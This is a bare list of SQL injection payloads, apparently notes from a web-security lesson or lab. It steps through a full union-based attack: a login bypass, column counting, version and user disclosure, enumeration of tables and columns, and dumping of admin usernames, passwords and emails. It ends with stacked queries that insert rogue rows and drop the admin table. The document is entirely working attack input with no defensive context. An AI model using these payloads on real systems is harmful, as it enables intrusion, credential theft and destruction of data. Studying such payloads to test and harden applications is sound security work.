************************************************* SQL injection Queries ********************************************

hsoub';--

' or '1'='1';--  
 
hsoub' order by 1;--

hsoub' order by 7;--

' union select 1,2,3,4,5,6 from member;--

' union select 1,@@version,current_user(),4,5,6 from member;--

' UNION SELECT 1,table_name,3,4,5,6 FROM information_schema.tables WHERE table_schema = 'db_member';-- 
   
' UNION SELECT 1,column_name,3,4,5,6 FROM information_schema.columns WHERE table_schema = 'db_member';--

' UNION SELECT 1,column_name,3,4,5,6 FROM information_schema.columns WHERE table_name = 'member';--

' union select 1,2,3 from admin;--

' union select 1,2,3,4,5,6 from admin;--

' union select id,username,password,email,firstname,lastname from admin;--

' union select id,username,password,email,firstname,lastname from admin WHERE id = 2;  

' union select id,username,password,email,firstname,lastname from admin username= admin2;  

' union select id,username,password from admin WHERE id = 2;  

'; INSERT INTO comment VALUES (25,'hacker','hacker');--    

'; DROP TABLE admin;--

